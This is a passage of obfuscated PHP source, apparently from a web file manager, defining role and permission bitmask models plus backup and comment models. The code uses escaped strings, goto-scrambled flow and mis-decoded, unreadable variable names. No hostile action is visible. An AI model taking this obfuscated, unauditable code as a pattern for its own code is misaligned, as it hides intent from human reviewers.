"\151\x67\x6e\x6f\x72\x65\106\151\154\x65\x53\x69\x7a\x65", "\141\144\155\151\156\151\x73\164\162\141\x74\157\162", "\x73\157\162\x74"); public function listData($dö»œ¬óåÃ = false, $c¡èËê•∑÷ = "\163\157\162\x74", $BûíÌ≈ß¯ã = false) { return parent::listData($dö»œ¬óåÃ, $c¡èËê•∑÷, $BûíÌ≈ß¯ã); } public function update($f£ò∫â∫Ô, $a‚îÛ–ç‘è) { goto Cªæ§Ñ‰Ï£; Cªæ§Ñ‰Ï£: $c‰âÂà€Á· =& $_SERVER[£¿ÌÙëü¡¯¯]; $C∆»ªˆ™Àù = parent::listData($f£ò∫â∫Ô); $A¥˘√ªËπ¯ = $this->findByName($a‚îÛ–ç‘è[$c‰âÂà€Á·[28]]); goto eö£âï–ó; eö£âï–ó: if (!$C∆»ªˆ™Àù || $A¥˘√ªËπ¯ && $A¥˘√ªËπ¯[$c‰âÂà€Á·[364]] != $C∆»ªˆ™Àù[$c‰âÂà€Á·[364]]) { return !1; } if ($A¥˘√ªËπ¯[$c‰âÂà€Á·[2362]] == 1) { $a‚îÛ–ç‘è = array($c‰âÂà€Á·[28] => $a‚îÛ–ç‘è[$c‰âÂà€Á·[28]], $c‰âÂà€Á·[2031] => $a‚îÛ–ç‘è[$c‰âÂà€Á·[2031]]); } $this->filterAuth($a‚îÛ–ç‘è[$c‰âÂà€Á·[373]]); goto c∆„¥„§Î≥; c∆„¥„§Î≥: return parent::update($f£ò∫â∫Ô, $a‚îÛ–ç‘è); goto Bè≤÷–è‰⁄; Bè≤÷–è‰⁄: } public function remove($bÁ†äßƒ∞Â) { $dê¢¿ﬁ‡€∫ = parent::listData($bÁ†äßƒ∞Â); if (!$dê¢¿ﬁ‡€∫ || $dê¢¿ﬁ‡€∫[$_SERVER[£¿ÌÙëü¡¯¯][1054]]) { return !1; } return parent::remove($bÁ†äßƒ∞Â); } public function add($Eª√…ûãëé) { goto Dá†Ûà’é—; Dá†Ûà’é—: $AŒ¯¥Œ“ÙË =& $_SERVER[£¿ÌÙëü¡¯¯]; $FñèËÜ‚Ñ≈ = $Eª√…ûãëé[$AŒ¯¥Œ“ÙË[28]]; if ($this->findByName($FñèËÜ‚Ñ≈)) { return !1; } goto C∞∂õÔÔÿ∂; C∞∂õÔÔÿ∂: $E‹¡°ÑÚÎÎ = array($AŒ¯¥Œ“ÙË[383] => $FñèËÜ‚Ñ≈, $AŒ¯¥Œ“ÙË[2019] => $AŒ¯¥Œ“ÙË[33], $AŒ¯¥Œ“ÙË[2015] => $AŒ¯¥Œ“ÙË[2032], $AŒ¯¥Œ“ÙË[2363] => 1, $AŒ¯¥Œ“ÙË[2018] => 0, $AŒ¯¥Œ“ÙË[2364] => 0, $AŒ¯¥Œ“ÙË[2017] => $this->getSort()); $Eª√…ûãëé = array_merge($E‹¡°ÑÚÎÎ, $Eª√…ûãëé); $this->filterAuth($Eª√…ûãëé[$AŒ¯¥Œ“ÙË[373]]); goto bÍåÜ›‰Í≈; bÍåÜ›‰Í≈: return parent::insert($Eª√…ûãëé); goto Bæ†ÓÑ√‹ß; Bæ†ÓÑ√‹ß: } private function getSort() { $Fíò∑≠•Ω£ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FΩ∑ÿÀÕ‹Ó = parent::listData(); $E£ƒØ≠…â = array_to_keyvalue($FΩ∑ÿÀÕ‹Ó, $Fíò∑≠•Ω£[33], $Fíò∑≠•Ω£[2034]); return empty($E£ƒØ≠…â) ? 0 : max($E£ƒØ≠…â) + 1; } private function filterAuth(&$D∆§†ãâì) { $d€Œÿ•ñ∞ü =& $_SERVER[£¿ÌÙëü¡¯¯]; $D‘∫Ÿä°å€ = array(); $fîâíçå…ú = array_filter(explode($d€Œÿ•ñ∞ü[47], $D∆§†ãâì)); foreach ($fîâíçå…ú as $D∆§†ãâì) { $bÚ»È¨™”ÿ = explode($d€Œÿ•ñ∞ü[94], $D∆§†ãâì); if ($bÚ»È¨™”ÿ[0] == $d€Œÿ•ñ∞ü[1692] && $bÚ»È¨™”ÿ[1] != $d€Œÿ•ñ∞ü[1011]) { $E÷êô∑Ö∆¬ = $bÚ»È¨™”ÿ[0] . $d€Œÿ•ñ∞ü[94] . $bÚ»È¨™”ÿ[1] . $d€Œÿ•ñ∞ü[2365]; if (!in_array($E÷êô∑Ö∆¬, $fîâíçå…ú)) { $D‘∫Ÿä°å€[] = $E÷êô∑Ö∆¬; } } $D‘∫Ÿä°å€[] = $D∆§†ãâì; } $D∆§†ãâì = implode($d€Œÿ•ñ∞ü[47], $D‘∫Ÿä°å€); } public function sort($eÃ∑’Æ≠÷Ÿ, $eÕËøîŒÛ‡) { return parent::update($eÃ∑’Æ≠÷Ÿ, $eÕËøîŒÛ‡); } } goto FµÒŸÀ≥é; A∑»ÌàüﬁÁ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $b‹Ã≠›µƒ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D‚ËàÚ≠‘ª = array(array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2014]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2016], $b‹Ã≠›µƒ„[2017] => 6, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2020]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2021], $b‹Ã≠›µƒ„[2017] => 1, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2022]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2023], $b‹Ã≠›µƒ„[2017] => 2, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2024]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2023], $b‹Ã≠›µƒ„[2017] => 3, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2025]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2026], $b‹Ã≠›µƒ„[2017] => 4, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => self::AUTH_SHOW | self::AUTH_VIEW), array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2027]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2028], $b‹Ã≠›µƒ„[2017] => 5, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b‹Ã≠›µƒ„[383] => LNG($b‹Ã≠›µƒ„[2029]), $b‹Ã≠›µƒ„[2015] => $b‹Ã≠›µƒ„[2030], $b‹Ã≠›µƒ„[2017] => 7, $b‹Ã≠›µƒ„[2018] => 1, $b‹Ã≠›µƒ„[2019] => 0)); return $D‚ËàÚ≠‘ª; } public static function authCheck($eèûÏóÛÔ•, $A≈Õ®–◊ù´) { $eèûÏóÛÔ• = intval($eèûÏóÛÔ•); if (_get($GLOBALS, $_SERVER[£¿ÌÙëü¡¯¯][453])) { return !0; } if ($eèûÏóÛÔ• <= 0) { return !1; } if (($eèûÏóÛÔ• & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($eèûÏóÛÔ• & $A≈Õ®–◊ù´); } public static function authCheckShow($B†ƒÙÌ‰ç’) { return self::authCheck($B†ƒÙÌ‰ç’, self::AUTH_SHOW); } public static function authCheckView($C¯Ò·ãáç°) { return self::authCheck($C¯Ò·ãáç°, self::AUTH_VIEW); } public static function authCheckDownload($fó—ç±÷‡§) { return self::authCheck($fó—ç±÷‡§, self::AUTH_DOWNLOAD); } public static function authCheckUpload($c™±Ú∂È∏í) { return self::authCheck($c™±Ú∂È∏í, self::AUTH_UPLOAD); } public static function authCheckEdit($A¥‘Ãñ∞ˆÀ) { return self::authCheck($A¥‘Ãñ∞ˆÀ, self::AUTH_EDIT); } public static function authCheckRemove($B÷åÿ‰Ü≤◊) { return self::authCheck($B÷åÿ‰Ü≤◊, self::AUTH_REMOVE); } public static function authCheckShare($Cœùª™Û•£) { return self::authCheck($Cœùª™Û•£, self::AUTH_SHARE); } public static function authCheckComment($Eﬂåﬂ®Ö◊‰) { return self::authCheck($Eﬂåﬂ®Ö◊‰, self::AUTH_COMMENT); } public static function authCheckEvent($DÑçÖàãÍß) { return self::authCheck($DÑçÖàãÍß, self::AUTH_EVENT); } public static function authCheckRoot($CìÂââÿåÉ) { return self::authCheck($CìÂââÿåÉ, self::AUTH_ROOT); } public static function authDisable($bß…Ç‰óÖË, $DÏ∏∫Ç÷ëº) { if (intval($bß…Ç‰óÖË) <= 0) { return 0; } return intval($bß…Ç‰óÖË) & ~$DÏ∏∫Ç÷ëº; } public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x6f\x75\162\143\145\x41\165\x74\150\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\x75\x74\x68", "\154\141\x62\145\x6c", "\x64\151\163\x70\x6c\141\171", "\x73\x79\163\x74\x65\x6d", "\163\157\x72\164"); public function initData() { $A©ã±ÁöŒí = $this->authDefault(); foreach ($A©ã±ÁöŒí as $bßúó€Á™€) { $this->add($bßúó€Á™€); } } public function listData($AÉîﬂ˜üõ„ = false, $eº»åè»ùÙ = "\163\157\x72\x74", $Fú£≈⁄«âÓ = false) { return parent::listData($AÉîﬂ˜üõ„, $eº»åè»ùÙ, $Fú£≈⁄«âÓ); } public function update($C§êÂ£á‰Ø, $B–õ’ëæ ñ) { $cü∞∫–ÔÆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eé¯êÓƒµ› = parent::listData($C§êÂ£á‰Ø); $a∂™«Ã¨◊Ω = $this->findByName($B–õ’ëæ ñ[$cü∞∫–ÔÆ[28]]); if (!$Eé¯êÓƒµ› || $a∂™«Ã¨◊Ω && $a∂™«Ã¨◊Ω[$cü∞∫–ÔÆ[364]] != $Eé¯êÓƒµ›[$cü∞∫–ÔÆ[364]]) { return !1; } $this->filterAuth($B–õ’ëæ ñ[$cü∞∫–ÔÆ[373]]); return parent::update($C§êÂ£á‰Ø, $B–õ’ëæ ñ); } public function remove($A¡®¥éì»¨) { $d÷•ƒ´Ó¡ﬁ = parent::listData($A¡®¥éì»¨); if (!$d÷•ƒ´Ó¡ﬁ || $d÷•ƒ´Ó¡ﬁ[$_SERVER[£¿ÌÙëü¡¯¯][1054]]) { return !1; } return parent::remove($A¡®¥éì»¨); } public function add($F†áòÃƒº∏ = array()) { goto B”´óäó≠; EµÈöΩä è: return parent::insert($F†áòÃƒº∏); goto Fè©¬ú™Ô¢; fÏ¬ˆ¨∆£√: $F†áòÃƒº∏ = array_merge($a‘ÆÚîóﬁâ, $F†áòÃƒº∏); $F†áòÃƒº∏[$Aœ∂ŒÏ€Âÿ[2034]] = $this->getSort(); $this->filterAuth($F†áòÃƒº∏[$Aœ∂ŒÏ€Âÿ[373]]); goto EµÈöΩä è; B”´óäó≠: $Aœ∂ŒÏ€Âÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->findByName($F†áòÃƒº∏[$Aœ∂ŒÏ€Âÿ[28]])) { return !1; } $a‘ÆÚîóﬁâ = array($Aœ∂ŒÏ€Âÿ[28] => $Aœ∂ŒÏ€Âÿ[33], $Aœ∂ŒÏ€Âÿ[373] => 1, $Aœ∂ŒÏ€Âÿ[2031] => $Aœ∂ŒÏ€Âÿ[2032], $Aœ∂ŒÏ€Âÿ[2033] => 1, $Aœ∂ŒÏ€Âÿ[1054] => 0, $Aœ∂ŒÏ€Âÿ[2034] => 0); goto fÏ¬ˆ¨∆£√; Fè©¬ú™Ô¢: } private function getSort() { $e·ä≥¯ô‡¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÜàò ª›º = parent::listData(); $eó¿äüäú = array_to_keyvalue($EÜàò ª›º, $e·ä≥¯ô‡¶[33], $e·ä≥¯ô‡¶[2034]); return empty($eó¿äüäú) ? 0 : max($eó¿äüäú) + 1; } private function filterAuth(&$D±Üâ∂È£Û) { goto FﬁéÌöÈßò; A∞¯⁄≤“òâ: foreach ($fˆ¯Éüä◊∞ as $E¯ßÉâ∂ú) { if ($D±Üâ∂È£Û & $E¯ßÉâ∂ú) { $E„ÏßûÍâ€[] = $E¯ßÉâ∂ú; } } if (in_array(self::AUTH_ROOT, $E„ÏßûÍâ€)) { $D±Üâ∂È£Û = array_sum($fˆ¯Éüä◊∞); return; } $c¿óú§ëúã = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto EÏ®ùëÓ©Ç; EÏ®ùëÓ©Ç: foreach ($E„ÏßûÍâ€ as $E¯ßÉâ∂ú) { if (isset($c¿óú§ëúã[$E¯ßÉâ∂ú])) { $E„ÏßûÍâ€ = array_merge($E„ÏßûÍâ€, $c¿óú§ëúã[$E¯ßÉâ∂ú]); } } $E„ÏßûÍâ€[] = self::AUTH_SHOW; $D±Üâ∂È£Û = array_sum(array_unique($E„ÏßûÍâ€)); goto F≈—Ì°∞ë£; FﬁéÌöÈßò: if (!$D±Üâ∂È£Û) { return; } $fˆ¯Éüä◊∞ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $E„ÏßûÍâ€ = array(); goto A∞¯⁄≤“òâ; F≈—Ì°∞ë£: } public function sort($e£·≠òé¿§, $FÛ—ÂÖªÿ•) { return parent::update($e£·≠òé¿§, $FÛ—ÂÖªÿ•); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x62\141\x63\x6b\165\x70\114\x69\163\164"; public $field = array("\151\x6f", "\x6e\141\x6d\145", "\163\x74\x61\164\165\x73", "\x63\x6f\x6e\164\145\156\x74", "\162\x65\x73\165\x6c\x74", "\164\151\155\x65\x46\162\x6f\155", "\164\x69\155\145\124\x6f"); public function config() { goto b÷∫ÈãŒà√; bÚùÈüÏ°∏: Action($eÌ∂ßãÈ◊Á[2035])->taskInit(); $A¥∑êüÍÇÏ = Model($eÌ∂ßãÈ◊Á[2036])->listData(); foreach ($A¥∑êüÍÇÏ as $Cêßﬂ’‘Ù‰) { if ($Cêßﬂ’‘Ù‰[$eÌ∂ßãÈ◊Á[1054]] == $eÌ∂ßãÈ◊Á[84] && $Cêßﬂ’‘Ù‰[$eÌ∂ßãÈ◊Á[1337]] == $eÌ∂ßãÈ◊Á[2037]) { $E¨üŸÃ≠˘∑ = $Cêßﬂ’‘Ù‰; break; } } goto f∫”∏Ã¨û‡; d…´—ΩﬁëÙ: $dÊÃ–Öˆä∏ = is_array($dÊÃ–Öˆä∏) ? $dÊÃ–Öˆä∏ : array(); if (!isset($dÊÃ–Öˆä∏[$eÌ∂ßãÈ◊Á[679]])) { $dÊÃ–Öˆä∏[$eÌ∂ßãÈ◊Á[679]] = $eÌ∂ßãÈ◊Á[464]; } $E¨üŸÃ≠˘∑ = array(); goto bÚùÈüÏ°∏; b÷∫ÈãŒà√: $eÌ∂ßãÈ◊Á =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÊÃ–Öˆä∏ = Model($eÌ∂ßãÈ◊Á[1062])->get($eÌ∂ßãÈ◊Á[698]); $dÊÃ–Öˆä∏ = json_decode($dÊÃ–Öˆä∏, !0); goto d…´—ΩﬁëÙ; f∫”∏Ã¨û‡: if (isset($E¨üŸÃ≠˘∑[$eÌ∂ßãÈ◊Á[187]])) { $E¨üŸÃ≠˘∑[$eÌ∂ßãÈ◊Á[187]] = json_decode($E¨üŸÃ≠˘∑[$eÌ∂ßãÈ◊Á[187]], !0); } if (isset($dÊÃ–Öˆä∏[$eÌ∂ßãÈ◊Á[187]])) { $E¨üŸÃ≠˘∑[$eÌ∂ßãÈ◊Á[187]][$eÌ∂ßãÈ◊Á[1324]] = $dÊÃ–Öˆä∏[$eÌ∂ßãÈ◊Á[187]]; unset($dÊÃ–Öˆä∏[$eÌ∂ßãÈ◊Á[187]]); } return array_merge($E¨üŸÃ≠˘∑, $dÊÃ–Öˆä∏); goto DΩ‚¿˘†®Ó; DΩ‚¿˘†®Ó: } public function listData($e√¯çì˜ó‰ = false, $B¬Û∏∑ºà∫ = "\x6d\x6f\144\x69\146\x79\124\x69\x6d\145", $Aäå’âµ¡Ü = false) { return parent::listData($e√¯çì˜ó‰, $B¬Û∏∑ºà∫, !0); } public function lastItem() { $bﬁı€≈ìäÉ = $this->listData(); return !empty($bﬁı€≈ìäÉ[0]) ? $bﬁı€≈ìäÉ[0] : null; } public function kill($eﬂÀâ∆ªù¨) { goto CûàâÓîŸ•; F≥Ö◊√ò‡ã: return $this->remove($eﬂÀâ∆ªù¨); goto e¿Ë◊¡ÖÆ⁄; CûàâÓîŸ•: $CáÏêçá°Ô =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÁàé˘õ°Ö = $this->listData($eﬂÀâ∆ªù¨); if (!$AÁàé˘õ°Ö || empty($AÁàé˘õ°Ö[$CáÏêçá°Ô[28]])) { return !0; } goto A÷€∫ßøéπ; cë◊Û‰ö¯Ø: $d±à∆â◊œº = $AÁàé˘õ°Ö[$CáÏêçá°Ô[28]]; $E¢çõûÙñˆ = TEMP_FILES . $CáÏêçá°Ô[705] . $d±à∆â◊œº . $CáÏêçá°Ô[8]; IO::remove($E¢çõûÙñˆ, !1); goto F≥Ö◊√ò‡ã; A÷€∫ßøéπ: Task::kill($CáÏêçá°Ô[697]); Task::kill($CáÏêçá°Ô[727]); Task::kill($CáÏêçá°Ô[734]); goto cë◊Û‰ö¯Ø; e¿Ë◊¡ÖÆ⁄: } public function remove($BåùÜÒÒﬂ›) { $EñÜÒ’ª∫„ = $this->listData($BåùÜÒÒﬂ›); if (!$EñÜÒ’ª∫„) { return !0; } return $this->backupRemove($EñÜÒ’ª∫„); } private function backupRemove($E€ŒïÒÃÀŸ) { $a¢™‚∫æ∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; parent::remove($E€ŒïÒÃÀŸ[$a¢™‚∫æ∫[364]]); $C∆„‘Û∫Øü = "\173\151\x6f\72{$E€ŒïÒÃÀŸ[$a¢™‚∫æ∫[678]]}\175\57\144\x61\164\141\142\x61\163\145\x2f" . $E€ŒïÒÃÀŸ[$a¢™‚∫æ∫[28]]; IO::remove($C∆„‘Û∫Øü, !1); return !0; } public function start() { goto CóâµÌºª“; bå‚“ä©áæ: return !0; goto D†œÂ¨•œé; f√˘ø€ç †: if (Hook::trigger($AÖàŒû“ÔÑ[2038]) == $AÖàŒû“ÔÑ[2039]) { return !0; } $eçéÔÀÙïÈ = $this->process(); foreach ($eçéÔÀÙïÈ as $c£˘–·∫ﬂ–) { if ($c£˘–·∫ﬂ–) { return Task::restart($c£˘–·∫ﬂ–[$AÖàŒû“ÔÑ[364]]); } } goto Fﬁö¨‚≈ÓÛ; CóâµÌºª“: $AÖàŒû“ÔÑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AËâ≥ﬁπúú = $this->config(); if (!$AËâ≥ﬁπúú || $AËâ≥ﬁπúú[$AÖàŒû“ÔÑ[1322]] != $AÖàŒû“ÔÑ[84]) { return !1; } goto f√˘ø€ç †; Fﬁö¨‚≈ÓÛ: $E„£ä•∂√Ë = new Backup(); $E„£ä•∂√Ë->keep(); if (!$E„£ä•∂√Ë->db()) { return !1; } goto d¡®¿√”üÍ; d¡®¿√”üÍ: if (!$E„£ä•∂√Ë->dbFile()) { return !1; } if ($AËâ≥ﬁπúú[$AÖàŒû“ÔÑ[679]] == $AÖàŒû“ÔÑ[464]) { $E„£ä•∂√Ë->file(); } Backup::set(array($AÖàŒû“ÔÑ[676] => 1, $AÖàŒû“ÔÑ[690] => time())); goto bå‚“ä©áæ; D†œÂ¨•œé: } public function process() { $c›˘ı◊ç€‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($c›˘ı◊ç€‘[681] => Task::get($c›˘ı◊ç€‘[697]), $c›˘ı◊ç€‘[684] => Task::get($c›˘ı◊ç€‘[727]), $c›˘ı◊ç€‘[164] => Task::get($c›˘ı◊ç€‘[734])); } public function restore() { $cæê≠ òÏ£ =& $_SERVER[£¿ÌÙëü¡¯¯]; ActionCall($cæê≠ òÏ£[2040], !0, 1); ActionCall($cæê≠ òÏ£[2040], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\164"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\x6d\145" => "\143\157\155\155\x65\x6e\164\x5f\155\x65\164\x61", "\x6d\x65\164\x61\x46\151\145\154\x64" => "\143\x6f\155\155\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Bﬂà©‡õàø) { $eìÜÇëå‚Œ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($Bﬂà©‡õàø[$eìÜÇëå‚Œ[2041]]) { $FÖ‚æ€¢Ÿ√ = $this->where(array($eìÜÇëå‚Œ[2042] => $Bﬂà©‡õàø[$eìÜÇëå‚Œ[2041]]))->find(); if (!$FÖ‚æ€¢Ÿ√ || $FÖ‚æ€¢Ÿ√[$eìÜÇëå‚Œ[368]] != $Bﬂà©‡õàø[$eìÜÇëå‚Œ[368]] || $FÖ‚æ€¢Ÿ√[$eìÜÇëå‚Œ[452]] != $Bﬂà©‡õàø[$eìÜÇëå‚Œ[452]]) { return !1; } $this->where(array($eìÜÇëå‚Œ[2042] => $Bﬂà©‡õàø[$eìÜÇëå‚Œ[2041]]))->setAdd($eìÜÇëå‚Œ[2043], 1); } return $this->add($Bﬂà©‡õàø); } public function remove($B¡Æâõä£≤) { $D†ñëÒõœã =& $_SERVER[£¿ÌÙëü¡¯¯]; $cØÏâÔÜÎ« = array($D†ñëÒõœã[2042] => $B¡Æâõä£≤); $Cç©¨’ÿÖë = $this->where($cØÏâÔÜÎ«)->find(); if ($Cç©¨’ÿÖë[$D†ñëÒõœã[2041]]) { $this->where(array($D†ñëÒõœã[2042] => $Cç©¨’ÿÖë[$D†ñëÒõœã[2041]]))->setAdd($D†ñëÒõœã[2043], -1); } return $this->where($cØÏâÔÜÎ«)->delete(); } public function edit($AúâÍïâãß, $Aó≤Êº™è£) { $bôº∏‰≥§À =& $_SERVER[£¿ÌÙëü¡¯¯]; $E‰ÛÎ˜ˆÂƒ = array($bôº∏‰≥§À[2042] => $AúâÍïâãß); return $this->where($E‰ÛÎ˜ˆÂƒ)->save(array($bôº∏‰≥§À[2044] => $Aó≤Êº™è£)); } public function prasise($Aê’∞…•ØÒ) { $BÍ£∂çñà’ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A†≈ªå¢ï™ = Model($BÍ£∂çñà’[2045]); $EŒ–Ÿ‹Ò°á = array($BÍ£∂çñà’[2042] => $Aê’∞…•ØÒ, $BÍ£∂çñà’[1340] => USER_ID); $D≤•“äòí• = $A†≈ªå¢ï™->where($EŒ–Ÿ‹Ò°á)->find(); if (!$D≤•“äòí•) { $A†≈ªå¢ï™->add($EŒ–Ÿ‹Ò°á); $dî®©Æè Ù = $this->where(array($BÍ£∂çñà’[2042] => $Aê’∞…•ØÒ))->setAdd($BÍ£∂çñà’[2046], 1); } else { $A†≈ªå¢ï™->where($EŒ–Ÿ‹Ò°á)->delete(); $dî®©Æè Ù = $this->where(array($BÍ£∂çñà’[2042] => $Aê’∞…•ØÒ))->setAdd($BÍ£∂çñà’[2046], -1); } return $dî®©Æè Ù; } public function targetInfo($B•¿©˘“˜Ü, $eöå∆æ«ãΩ) { goto Dæ‚ùª“ÒÓ; Dæ‚ùª“ÒÓ: $Fè¶≤πìßÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eà·Ó´Õ€ = array($Fè¶≤πìßÂ[513] => $B•¿©˘“˜Ü, $Fè¶≤πìßÂ[514] => $eöå∆æ«ãΩ); $dπÇÉ⁄À€¯ = $this->where($eà·Ó´Õ€)->count(); goto Cøëà¯ö™°; Cøëà¯ö™°: $EﬁãÍ‚ÜÑù = "\122\x49\x47\x48\x54\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\x65\x6e\x74\137\160\x72\x61\x69\163\x65\x20\163\164\x61\x72\x20\x6f\x6e\x20\143\x6f\x6d\155\145\156\x74\56\x63\x6f\x6d\155\x65\156\x74\x49\x44\x20\75\x20\163\164\141\162\56\143\x6f\155\x6d\145\x6e\164\x49\104"; $C˜œ»≥Úïü = $this->alias($Fè¶≤πìßÂ[337])->where($eà·Ó´Õ€)->join($EﬁãÍ‚ÜÑù, $Fè¶≤πìßÂ[2047])->count(); $bÉﬁºÌ†º£ = array($Fè¶≤πìßÂ[2048] => $dπÇÉ⁄À€¯, $Fè¶≤πìßÂ[2049] => $C˜œ»≥Úïü); goto b¨ø„ÚƒŸ“; b¨ø„ÚƒŸ“: return $bÉﬁºÌ†º£; goto eÀüç≤Ç∞‰; eÀüç≤Ç∞‰: } public function listData($A˜Ö‰¶éŸØ) { $EÙ∆Ö¬‡†Œ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2050]])) { if ($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2050]]) { $A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2051]] = array($EÙ∆Ö¬‡†Œ[926], intval($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2050]])); } unset($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2050]]); } if (isset($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2052]])) { if ($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2052]]) { $A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2051]] = array($EÙ∆Ö¬‡†Œ[923], intval($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2052]])); } unset($A˜Ö‰¶éŸØ[$EÙ∆Ö¬‡†Œ[2052]]); } return $this->_listData($A˜Ö‰¶éŸØ); } private function _listData($aüø”Ö¡—É) { $C∞√ÕÉãîô =& $_SERVER[£¿ÌÙëü¡¯¯]; $EŒıîî≈Î© = $this->where($aüø”Ö¡—É)->_makeOrder()->selectPage(100); $this->_listAppendParent($EŒıîî≈Î©[$C∞√ÕÉãîô[350]]); $this->_listAppendUser($EŒıîî≈Î©[$C∞√ÕÉãîô[350]]); $this->_listAppendMeta($EŒıîî≈Î©[$C∞√ÕÉãîô[350]]); return $EŒıîî≈Î©; } private function _makeOrder() { $bå® Ö¿Öà =& $_SERVER[£¿ÌÙëü¡¯¯]; $b»±◊◊á∫ë = array($bå® Ö¿Öà[2046], $bå® Ö¿Öà[2043], $bå® Ö¿Öà[184]); $DªÖ⁄∏ˆπæ = Input::get($bå® Ö¿Öà[403], $bå® Ö¿Öà[7], $bå® Ö¿Öà[386], $b»±◊◊á∫ë); $b˜±éòŒ“· = Input::get($bå® Ö¿Öà[404], $bå® Ö¿Öà[7], $bå® Ö¿Öà[1342], array($bå® Ö¿Öà[2053], $bå® Ö¿Öà[401])); $A«Ÿ÷î√ÖÊ = $DªÖ⁄∏ˆπæ . $bå® Ö¿Öà[50] . $b˜±éòŒ“·; return $this->order($A«Ÿ÷î√ÖÊ); } private function _listAppendParent(&$D›√ôôüî´) { goto eœÀ‚»ÖÁœ; E”éÊ–û∞¶: foreach ($D›√ôôüî´ as &$CÖ√êπùà) { if (isset($A≈ˆ¯ÿóå[$CÖ√êπùà[$fÒªÑ◊˘”Ú[2041]]])) { $CÖ√êπùà[$fÒªÑ◊˘”Ú[2054]] = $A≈ˆ¯ÿóå[$CÖ√êπùà[$fÒªÑ◊˘”Ú[2041]]]; } 